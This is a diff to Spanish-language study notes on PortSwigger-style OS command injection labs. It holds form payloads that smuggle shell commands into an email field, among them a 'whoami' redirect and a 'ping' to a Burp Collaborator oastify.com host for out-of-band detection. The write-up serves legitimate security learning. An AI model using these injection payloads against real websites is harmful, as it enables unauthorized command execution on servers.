@@ -30,5 +30,27 @@ csrf=Kfbe6pN4ThGKonJGCUZmmSS2tzjh6CF0&name=Masa&email=masa%40gmail.com|whoami>ou
 ```
 NO olvides que si no agregas los 2 || al final no se porque pero no sirve.
 
+# Blind OS command injection with out-of-band interaction
+
+Para este laboratorio se utilizo el Burp colaborator Client de nueva cuenta la vulnerabilidad reside en el Submit feedback y cuando se genera un 
+ DNS lookup to Burp Collaborator es cuando se resuelve el lab
+
+```
+csrf=ItkBikPD69urSsgTDkHVZmvP8g1NiQj8&name=Masa&email=masa%40gmail.com|ping woojq6yqontbtnxg748e0indw42wql.oastify.com||&subject=abcd1234&message=Comment
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
